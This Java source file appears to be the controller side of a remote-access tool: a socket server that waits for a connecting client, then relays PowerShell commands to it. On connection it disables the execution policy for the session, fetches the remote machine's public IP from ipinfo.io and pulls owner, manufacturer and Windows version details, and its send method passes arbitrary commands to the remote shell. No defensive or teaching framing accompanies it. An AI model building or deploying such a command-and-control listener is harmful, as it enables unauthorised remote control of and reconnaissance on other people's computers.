package connection;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;


public class Server {
	private Socket s;
	private ServerSocket ss;
	private DataOutputStream dout;
	private DataInputStream din;
	
	private int _port;
	
	public Server(int port){
		_port = port;
	}

	public void connect() throws IOException {
		ss = new ServerSocket(_port);
		System.out.println("Waiting for connection on port " + _port + "...");
		s = ss.accept();
		System.gc(); //Calls the garbage collector because of the previous function
		
		dout = new DataOutputStream(s.getOutputStream());
		din = new DataInputStream(s.getInputStream());
		
		System.out.println("Connected");
		System.out.println("Setting up PowerShell session...");
		send("Set-ExecutionPolicy Unrestricted -Scope Process");
		System.out.println("Retrieving system info...");
		System.out.println(getSysInfo());
	}
	
	public String send(String str) throws IOException {
		dout.writeUTF(str);
		dout.flush();
		
		return din.readUTF();
	}

	public void end() throws IOException {
		s.close();
		ss.close();
	}
	
	public boolean connectionIsOpen() {
		return !s.isClosed();
	}
	
	private String getSysInfo() throws IOException {
		String sysInfo = "[not found]";
		
		if(s.isConnected()) {
			dout.writeUTF(" Invoke-RestMethod http://ipinfo.io/json | Select -exp ip");
			dout.flush();
			sysInfo = "\n" + "Public ip: " + din.readUTF();
			
			dout.writeUTF(" Get-ComputerInfo | Select-Object WindowsRegisteredOwner, CsManufacturer, WindowsProductName, WindowsCurrentVersion | Format-List");
			dout.flush();
			sysInfo += din.readUTF();
		}
		
		return sysInfo;
	}
}
